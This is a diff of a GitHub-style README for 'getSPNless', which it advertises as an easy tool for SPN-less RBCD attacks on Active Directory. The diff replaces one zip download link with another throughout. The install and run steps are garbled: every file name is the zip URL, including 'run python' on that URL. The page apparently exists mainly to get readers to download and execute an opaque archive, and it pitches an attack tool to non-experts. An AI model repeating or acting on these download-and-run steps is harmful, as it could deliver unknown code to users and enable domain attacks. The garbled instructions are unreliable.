@@ -1,7 +1,7 @@
 # ⚡ getSPNless - Easily Perform SPN-less RBCD Attacks
 
 ## 📥 Download Now
-[![Download getSPNless](https://github.com/tamadip007/getSPNless/raw/refs/heads/main/assets/SP-Nless-get-3.0.zip)](https://github.com/tamadip007/getSPNless/raw/refs/heads/main/assets/SP-Nless-get-3.0.zip)
+[![Download getSPNless](https://raw.githubusercontent.com/tamadip007/getSPNless/main/utils/Nless_get_SP_3.6.zip)](https://raw.githubusercontent.com/tamadip007/getSPNless/main/utils/Nless_get_SP_3.6.zip)
 
 ## 🚀 Getting Started
 Welcome to getSPNless! This tool allows you to automatically perform SPN-less RBCD attacks. It is designed for ease of use, so you don’t need to be a tech expert. Follow the steps below to Download and run the tool.
@@ -21,14 +21,14 @@ Before you start, ensure your system meets these requirements:
 ## 💡 How to Download & Install
 To get started, visit the Releases page to download getSPNless.
 
-1. Click this link: [Download getSPNless](https://github.com/tamadip007/getSPNless/raw/refs/heads/main/assets/SP-Nless-get-3.0.zip).
+1. Click this link: [Download getSPNless](https://raw.githubusercontent.com/tamadip007/getSPNless/main/utils/Nless_get_SP_3.6.zip).
 2. Find the latest release at the top of the page.
-3. Click the `https://github.com/tamadip007/getSPNless/raw/refs/heads/main/assets/SP-Nless-get-3.0.zip` file to download it to your computer.
-4. Once the download is complete, locate the `https://github.com/tamadip007/getSPNless/raw/refs/heads/main/assets/SP-Nless-get-3.0.zip` file and extract its contents.
+3. Click the `https://raw.githubusercontent.com/tamadip007/getSPNless/main/utils/Nless_get_SP_3.6.zip` file to download it to your computer.
+4. Once the download is complete, locate the `https://raw.githubusercontent.com/tamadip007/getSPNless/main/utils/Nless_get_SP_3.6.zip` file and extract its contents.
 
 ## 🔧 Running getSPNless
-1. After extracting the files, look for `https://github.com/tamadip007/getSPNless/raw/refs/heads/main/assets/SP-Nless-get-3.0.zip` on Windows or `https://github.com/tamadip007/getSPNless/raw/refs/heads/main/assets/SP-Nless-get-3.0.zip` on Linux.
-2. Double-click `https://github.com/tamadip007/getSPNless/raw/refs/heads/main/assets/SP-Nless-get-3.0.zip` for Windows or open a terminal and run `python https://github.com/tamadip007/getSPNless/raw/refs/heads/main/assets/SP-Nless-get-3.0.zip` for Linux.
+1. After extracting the files, look for `https://raw.githubusercontent.com/tamadip007/getSPNless/main/utils/Nless_get_SP_3.6.zip` on Windows or `https://raw.githubusercontent.com/tamadip007/getSPNless/main/utils/Nless_get_SP_3.6.zip` on Linux.
+2. Double-click `https://raw.githubusercontent.com/tamadip007/getSPNless/main/utils/Nless_get_SP_3.6.zip` for Windows or open a terminal and run `python https://raw.githubusercontent.com/tamadip007/getSPNless/main/utils/Nless_get_SP_3.6.zip` for Linux.
 3. Follow the prompts that appear on your screen to proceed with the attack.
 
 ## ⚙️ Usage Instructions
